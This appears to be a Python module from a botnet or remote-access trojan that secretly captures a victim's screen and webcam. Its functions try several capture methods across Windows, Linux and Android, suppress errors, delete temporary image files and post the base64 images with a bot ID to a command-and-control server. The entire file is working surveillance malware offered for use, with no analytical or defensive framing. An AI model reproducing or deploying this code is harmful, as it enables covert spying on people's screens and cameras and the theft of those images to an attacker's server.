#!/usr/bin/env python3
# SCREENSHOT & WEBCAM MODULE - Capture target's screen/camera
import os
import sys
import base64
import time
from datetime import datetime

class ScreenshotCapture:
    def __init__(self, c2_server=None, bot_id=None):
        self.c2_server = c2_server
        self.bot_id = bot_id
        
    def capture_screenshot(self):
        """Capture screenshot using various methods"""
        try:
            # Try PIL first
            try:
                from PIL import ImageGrab
                screenshot = ImageGrab.grab()
                import io
                img_bytes = io.BytesIO()
                screenshot.save(img_bytes, format='PNG')
                img_data = img_bytes.getvalue()
                return base64.b64encode(img_data).decode()
            except:
                pass
            
            # Try mss (cross-platform)
            try:
                import mss
                with mss.mss() as sct:
                    monitor = sct.monitors[1]
                    screenshot = sct.grab(monitor)
                    import io
                    from PIL import Image
                    img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
                    img_bytes = io.BytesIO()
                    img.save(img_bytes, format='PNG')
                    return base64.b64encode(img_bytes.getvalue()).decode()
            except:
                pass
            
            # Try scrot (Linux)
            try:
                filename = f"/tmp/screenshot_{int(time.time())}.png"
                os.system(f"scrot {filename} 2>/dev/null")
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    os.remove(filename)
                    return data
            except:
                pass
            
            # Try termux-api (Android)
            try:
                filename = f"/sdcard/screenshot_{int(time.time())}.png"
                os.system(f"termux-screenshot {filename}")
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    os.remove(filename)
                    return data
            except:
                pass
            
            return None
        except Exception as e:
            return None
    
    def capture_webcam(self):
        """Capture webcam photo"""
        try:
            # Try OpenCV
            try:
                import cv2
                cap = cv2.VideoCapture(0)
                ret, frame = cap.read()
                if ret:
                    _, buffer = cv2.imencode('.jpg', frame)
                    cap.release()
                    return base64.b64encode(buffer).decode()
            except:
                pass
            
            # Try termux-api (Android)
            try:
                filename = f"/sdcard/webcam_{int(time.time())}.jpg"
                os.system(f"termux-camera-photo {filename}")
                if os.path.exists(filename):
                    with open(filename, 'rb') as f:
                        data = base64.b64encode(f.read()).decode()
                    os.remove(filename)
                    return data
            except:
                pass
            
            return None
        except:
            return None
    
    def send_to_c2(self, data, capture_type):
        """Send captured data to C2 server"""
        if not self.c2_server or not self.bot_id:
            return
        
        try:
            import requests
            payload = {
                "bot_id": self.bot_id,
                "type": capture_type,
                "data": data,
                "timestamp": str(datetime.now())
            }
            requests.post(f"{self.c2_server}/api/capture", json=payload, timeout=30)
        except:
            pass
